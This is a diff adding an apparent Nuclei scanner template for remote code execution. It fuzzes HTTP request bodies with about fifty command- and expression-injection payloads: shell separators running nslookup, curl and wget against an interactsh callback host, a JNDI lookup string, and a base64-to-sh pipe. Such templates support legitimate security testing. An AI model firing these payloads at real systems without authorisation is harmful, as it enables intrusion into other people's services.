@@ -1,0 +1,91 @@
+id: rce-body-collaborator
+
+info:
+  name: Remote Code Execution
+  author: reewardius
+  severity: critical
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body,fuzzing-req-body-query,fuzzing-req-rce-body-query,rce,dast
+  
+variables:
+  marker: "{{interactsh-url}}"
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'
+          - 'method == "PUT"'
+          - 'method == "DELETE"'
+          - 'method == "PATCH"'
+        
+    payloads:
+      rce:
+        - "$(exec('nslookup {{marker}}'))"
+        - "$(nslookup {{marker}})"
+        - "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)"
+        - "${'{{marker}}'.resolve}"
+        - "${dns({{'interactsh-url'}})}"
+        - "${jndi:ldap://127.0.0.1#.${hostname}.{{marker}}}"
+        - "${resolve({{'interactsh-url'}})}"
+        - "${url:UTF-8:https://{{Hostname}}.q.{{marker}}}"
+        - "%0A&&nslookup {{marker}}"
+        - "%0A;nslookup {{marker}}"
+        - "%0A||nslookup {{marker}}"
+        - "%0D%0A&&nslookup {{marker}}&&"
+        - "%0D%0A;nslookup {{marker}}"
+        - "%0D%0A||nslookup {{marker}}"
+        - "%0D%0A||nslookup {{marker}}||"
+        - "%0D&&nslookup {{marker}}"
+        - "%0D;nslookup {{marker}}"
+        - "%0D||nslookup {{marker}}"
+        - "&$(nslookup {{marker}})"
+        - "&&$(nslookup {{marker}})"
+        - "&&`nslookup {{marker}}`"
+        - "&&curl {{interactsh-url}}"
+        - "&&curl {{interactsh-url}}&&"
+        - "&&nslookup {{marker}}"
+        - "&&wget {{interactsh-url}}"
+        - "&&wget {{interactsh-url}}&&"
+        - "&`nslookup {{marker}}`"
+        - "&nslookup {{marker}}"
+        - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
+        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
+        - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
+        - ";$(nslookup {{marker}})"
+        - ";`nslookup {{marker}}`"
+        - ";curl {{interactsh-url}};"
+        - ";nslookup {{marker}}"
+        - ";nslookup {{marker}};"
+        - ";wget {{interactsh-url}};"
+        - "`curl {{interactsh-url}}`"
+        - "`nslookup {{marker}}`"
+        - "`wget {{interactsh-url}}`"
+        - "echo {{base64(url_encode('nslookup {{marker}}'))}}|base64 -d|sh}"
+        - "gethostbyname('{{marker}}');"
+        - "||$(nslookup {{marker}})"
+        - "||$(nslookup {{marker}});"
+        - "||$(nslookup {{marker}})||"
+        - "||`nslookup {{marker}}`"
+        - "||`nslookup {{marker}}`||"
+        - "||curl {{interactsh-url}}"
+        - "||curl {{interactsh-url}}||"
+        - "||nslookup {{marker}}||"
+        - "||wget {{interactsh-url}}"
+        - "||wget {{interactsh-url}}||"
+        
+    fuzzing:
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
